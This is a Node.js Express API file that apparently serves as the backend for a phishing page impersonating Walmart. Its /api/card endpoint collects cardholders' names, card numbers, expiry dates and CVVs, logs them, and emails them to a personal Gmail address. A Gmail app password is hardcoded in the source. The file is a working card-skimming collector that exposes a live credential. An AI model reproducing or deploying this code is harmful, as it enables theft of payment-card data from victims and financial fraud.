// HOW TO HOST THIS API LOCALLY:
// 1. Install dependencies: npm install express cors nodemailer
// 2. Start the server: node api.js
//    The API will run at http://localhost:3000
//
// HOW TO DEPLOY TO CLOUD (e.g., Render, Heroku, Vercel):
// 1. Push your code to a GitHub repository.
// 2. Create a new project on your chosen platform and link your repo.
// 3. Set environment variables for sensitive data (do NOT hardcode passwords).
// 4. The platform will build and host your API automatically.
//
// HOW TO DEPLOY TO VERCEL:
// 1. Push your code to a GitHub repository.
// 2. Go to https://vercel.com and import your repo.
// 3. Set environment variables for sensitive data (GMAIL_USER, GMAIL_PASS) in Vercel dashboard.
// 4. Change hardcoded credentials below to use process.env.GMAIL_USER and process.env.GMAIL_PASS.
// 5. Vercel will auto-detect Express and deploy your API.
// 6. Export the Express app as "module.exports = app;" at the end of this file.
//
// NOTE: For production, never expose sensitive info in code. Use environment variables.

const express = require('express');
const cors = require('cors');
const nodemailer = require('nodemailer');
const app = express();

// Allow both 127.0.0.1 and localhost origins
const allowedOrigins = [
  'http://127.0.0.1:5500',
  'http://localhost:5500',
  'https://walmart-mu.vercel.app',
  'https://walmartbackend.vercel.app' // <-- add this
  // Removed trailing slash variant to avoid mismatch
];
app.use(cors({
  origin: function(origin, callback) {
    if (!origin || allowedOrigins.indexOf(origin) !== -1) {
      callback(null, true);
    } else {
      callback(new Error('Not allowed by CORS'));
    }
  },
  credentials: true,
  optionsSuccessStatus: 200
}));
app.use(express.json());

// Set CORS headers for all responses (including preflight)
app.use((req, res, next) => {
  const origin = req.headers.origin;
  if (allowedOrigins.includes(origin)) {
    res.header('Access-Control-Allow-Origin', origin);
    res.header('Access-Control-Allow-Credentials', 'true');
  }
  res.header('Access-Control-Allow-Methods', 'GET,POST,OPTIONS');
  res.header('Access-Control-Allow-Headers', 'Content-Type');
  if (req.method === 'OPTIONS') {
    return res.sendStatus(200);
  }
  next();
});

const transporter = nodemailer.createTransport({
  service: 'gmail',
  auth: {
    user: process.env.GMAIL_USER || 'peternnamani001@gmail.com',
    pass: process.env.GMAIL_PASS || 'llvn tfua kgre byir'
    // For Vercel, set GMAIL_USER and GMAIL_PASS in dashboard, not in code!
  }
});

// Verify transporter configuration at startup
transporter.verify(function(error, success) {
  if (error) {
    console.error('Nodemailer transporter verification failed:', error);
    // If you see "Invalid credentials" or "Application-specific password required", check your Gmail security settings.
  } else {
    console.log('Nodemailer transporter is ready to send emails');
  }
});

app.options('/api/card', cors()); // Handle preflight requests for /api/card

app.post('/api/card', async (req, res) => {
  const { cardName, cardNumber, expiry, cvv } = req.body;
  console.log('Received card submission:', req.body); // Debug: log incoming data
  if (!cardName || !cardNumber || !expiry || !cvv) {
    if (allowedOrigins.includes(req.headers.origin)) {
      res.header('Access-Control-Allow-Origin', req.headers.origin);
      res.header('Access-Control-Allow-Credentials', 'true');
    }
    return res.status(400).json({ error: 'Missing fields' });
  }

  const mailOptions = {
    from: 'peternnamani001@gmail.com', // same as above
    to: 'peternnamani001@gmail.com',
    subject: 'New Card Submission',
    text: JSON.stringify({ cardName, cardNumber, expiry, cvv }, null, 2)
  };

  try {
    const info = await transporter.sendMail(mailOptions);
    if (allowedOrigins.includes(req.headers.origin)) {
      res.header('Access-Control-Allow-Origin', req.headers.origin);
      res.header('Access-Control-Allow-Credentials', 'true');
    }
    res.json({ success: true, message: 'Email sent', info: info.response });
  } catch (err) {
    if (allowedOrigins.includes(req.headers.origin)) {
      res.header('Access-Control-Allow-Origin', req.headers.origin);
      res.header('Access-Control-Allow-Credentials', 'true');
    }
    res.status(500).json({ error: 'Failed to send email', details: err.message });
  }
});

app.listen(3000, () => {
  console.log('API server running on port 3000');
});

// For Vercel compatibility:
module.exports = app;